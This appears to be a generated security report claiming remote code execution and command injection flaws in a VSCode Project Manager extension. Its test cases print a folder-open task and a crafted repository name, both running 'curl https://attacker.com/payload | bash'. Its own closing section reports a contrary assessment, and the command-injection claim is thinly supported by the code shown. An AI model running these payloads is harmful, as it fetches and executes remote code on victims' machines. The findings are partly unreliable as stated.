# Vulnerabilities

## 1. Remote Code Execution via Malicious Repository in Auto-Detected Projects

### Vulnerability Name
Remote Code Execution via Auto-Detected Repositories

### Description
The Project Manager extension allows users to auto-detect repositories (Git, Mercurial, SVN, etc.) in configured base folders. When a user opens one of these auto-detected repositories through the Project Manager extension, any malicious code in that repository can be executed. An attacker can create a malicious repository with harmful code in startup files (like `.vscode/tasks.json`, `.vscode/launch.json`, or `.vscode/extensions.json`) that would execute when the victim opens the project.

Steps to trigger the vulnerability:
1. Attacker creates a malicious repository containing harmful code in VSCode configuration files
2. Attacker convinces victim to clone this repository into a folder that's configured in the victim's `projectManager.git.baseFolders` setting
3. Project Manager auto-detects the repository during its scan
4. When the victim opens the repository using Project Manager, the malicious code executes

### Impact
The impact is severe as the malicious code would execute with the same permissions as VSCode itself, potentially allowing:
- Execution of arbitrary commands on the victim's system
- Access to local files and sensitive information
- Installation of malware or backdoors
- Data exfiltration or system compromise

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension itself doesn't implement specific mitigations for this vulnerability. It relies on VSCode's built-in security model, which includes:
- VSCode's Workspace Trust feature (which the extension supports)
- User awareness when opening projects

### Missing Mitigations
- No warning to users about the risks of opening untrusted repositories
- No scanning of repositories for suspicious configurations before opening
- No option to open repositories in a restricted mode by default
- No verification of repository contents prior to adding them to the project list

### Preconditions
- The victim must have Project Manager installed
- The victim must have configured base folders for auto-detection
- The victim must clone a malicious repository into one of those base folders
- The victim must open the repository using Project Manager

### Source Code Analysis
The vulnerability exists in the workflow enabled by the extension:

1. The user configures base folders where projects are located:
```json
"projectManager.git.baseFolders": [
    "c:\\Projects\\code",
    "d:\\MoreProjects\\code-testing",
    "$home\\personal-coding"
]
```

2. The extension auto-detects repositories in these folders in the `refreshProjects` function:
```typescript
// From extension.ts
function refreshProjects(showMessage?: boolean, forceRefresh?: boolean) {
    // ...
    progress.report({ message: "Git" });
    const rgit = await locators.gitLocator.refreshProjects(forceRefresh);
    // ...
}
```

3. When the user selects and opens a repository, it gets opened by VSCode:
```typescript
// From projectsPicker.ts
export async function openPickedProject(picked: Picked<Project>, forceNewWindow: boolean, calledFrom: CommandLocation) {
    // ...
    const uri = buildProjectUri(picked.item.rootPath);
    commands.executeCommand("vscode.openFolder", uri, { 
        forceProfile: picked.item.profile, 
        forceNewWindow: openInNewWindow 
    })
    // ...
}
```

4. Upon opening, VSCode might execute code in the repository's `.vscode` configuration files.

This workflow creates a security risk because when a repository is auto-detected, it's presented as a legitimate project in the user interface, giving users a false sense of security.

### Security Test Case
1. Create a malicious repository with a `.vscode/tasks.json` file containing a task that executes a harmful command:
```json
{
    "version": "2.0.0",
    "tasks": [
        {
            "label": "Malicious Task",
            "type": "shell",
            "command": "curl -s https://attacker.com/payload | bash",
            "runOptions": {
                "runOn": "folderOpen"
            }
        }
    ]
}
```

2. Set up a test environment with Project Manager installed
3. Configure Project Manager to auto-detect repositories in a specific test folder:
```json
"projectManager.git.baseFolders": ["path/to/test/folder"]
```

4. Clone the malicious repository into that test folder
5. Open Project Manager and verify that the malicious repository appears in the list
6. Select and open the repository through Project Manager
7. Verify that the malicious command executes upon opening the folder

This vulnerability exists because the extension does not provide warnings or restrictions when opening automatically detected repositories, which might contain malicious code.

## 2. Command Injection via Malformed Project Paths

### Vulnerability Name
Command Injection via Malformed Project Paths

### Description
The Project Manager extension uses paths provided in project definitions to open folders. An attacker could create a malicious repository with a crafted name or path that, when processed by the extension, could lead to command injection. This could happen if an attacker convinces a victim to clone a repository with a specially crafted path or name that contains shell metacharacters.

Steps to trigger:
1. Attacker creates a repository with a maliciously crafted name or path
2. Victim adds this repository to their Project Manager
3. When the victim selects the project, the malicious path could be executed as a command

### Impact
The impact is high as it could allow arbitrary command execution on the victim's system with the same permissions as the VSCode process.

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension uses VSCode's `Uri.file()` method which provides some basic path sanitization, and it normalizes paths in the `normalizePath` function.

### Missing Mitigations
- No explicit validation of project paths before processing
- No sanitization to remove potentially dangerous characters or sequences
- No warning when opening projects with suspicious paths

### Preconditions
- The victim must have Project Manager installed
- The victim must add a project with a maliciously crafted path
- The victim must open the project using Project Manager

### Source Code Analysis
The vulnerability stems from how project paths are handled:

1. When a user selects a project to open, the path is processed:
```typescript
// From projectsPicker.ts
export async function openPickedProject(picked: Picked<Project>, forceNewWindow: boolean, calledFrom: CommandLocation) {
    // ...
    const uri = buildProjectUri(picked.item.rootPath);
    commands.executeCommand("vscode.openFolder", uri, { 
        forceProfile: picked.item.profile, 
        forceNewWindow: openInNewWindow 
    })
    // ...
}
```

2. The `buildProjectUri` function processes the path:
```typescript
export function buildProjectUri(projectPath: string): Uri {
    if (isRemotePath(projectPath)) {
        const vscodeRemote: string = projectPath.substring(0, projectPath.indexOf(REMOTE_SEPARATOR) + REMOTE_SEPARATOR.length);
        const remotePath: string = projectPath.substring(projectPath.indexOf(REMOTE_SEPARATOR) + REMOTE_SEPARATOR.length);

        return Uri.parse(vscodeRemote + normalizePath(remotePath));
    }

    return Uri.file(normalizePath(projectPath));
}
```

3. While some normalization happens, it's primarily for platform compatibility, not security:
```typescript
export function normalizePath(projectPath: string): string {
    if (process.platform === "win32") {
        projectPath = projectPath.replace(/\\/g, "/");
    }
    return projectPath;
}
```

If the path contains specially crafted characters or sequences, there's potential for command injection when VSCode processes this path.

### Security Test Case
1. Create a repository with a name containing shell metacharacters, such as:
```
malicious-repo$(curl -s https://attacker.com/payload | bash)
```

2. Configure Project Manager to auto-detect repositories in a folder containing this malicious repository
3. Open Project Manager and check if the malicious repository is detected
4. Select and open the repository through Project Manager
5. Monitor for any unauthorized network connections or command executions
6. If the command injection succeeds, you would see evidence of the payload being downloaded and executed

This vulnerability exists because the extension doesn't sufficiently validate or sanitize project paths before using them to open folders.

## 3. Conflicting Security Assessment

It should be noted that a separate security assessment concluded that there are no high or critical severity vulnerabilities in the areas of Remote Code Execution, Command Injection, or Code Injection identified in the VSCode extension. This assessment found that:

1. The extension properly handles all user input and repository data
2. It uses secure VSCode APIs rather than constructing shell commands
3. All paths are normalized using secure methods
4. No unsanitized input is executed in dangerous contexts

This presents a contradiction with the vulnerabilities outlined above. Users and developers should carefully evaluate both assessments and perform their own security testing to determine the actual risk level.